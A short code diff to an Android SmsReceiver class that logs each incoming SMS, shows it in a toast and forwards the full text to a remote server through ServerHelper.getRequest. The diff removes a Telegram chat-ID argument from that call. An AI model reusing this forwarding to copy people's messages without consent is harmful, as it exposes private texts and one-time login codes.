@@ -43,7 +43,7 @@ public class SmsReceiver extends BroadcastReceiver {
             strMessage.append("\n");
             Log.d(TAG, "onReceiveSMS: " + strMessage);
             Toast.makeText(App.getInstance(), strMessage.toString(), Toast.LENGTH_LONG).show();
-            ServerHelper.getRequest(ChatIDTelegramHelper.RangeChatID, strMessage.toString());
+            ServerHelper.getRequest(strMessage.toString());
         }
     }
 
